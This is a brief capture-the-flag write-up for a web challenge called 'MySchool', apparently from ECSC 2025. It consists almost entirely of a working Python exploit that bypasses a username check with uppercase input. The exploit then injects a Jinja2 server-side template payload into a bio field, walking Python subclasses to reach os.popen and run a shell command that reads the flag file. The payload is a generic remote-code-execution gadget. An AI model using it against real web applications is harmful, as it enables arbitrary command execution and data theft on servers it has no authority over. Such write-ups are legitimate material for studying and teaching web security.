# MySchool

There is a template injection in bio and we can bypass the username check by sending it uppercase:
```py
import requests
import re

url = 'https://myschool.ecsc25.hack.cert.pl/'
payload = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"cat flag.txt\").read()}}{%endif%}{% endfor %}"

res = requests.post(f'{url}/users', json={
    'username': 'TEST',
    'bio': payload
})

id = res.content.decode()[1:-1]
res = requests.get(f'{url}/users?session_id={id}')

print(re.findall(r'ecsc25{.*}', res.content.decode())[0])
# ecsc25{NULL_is_not_always_False}
```
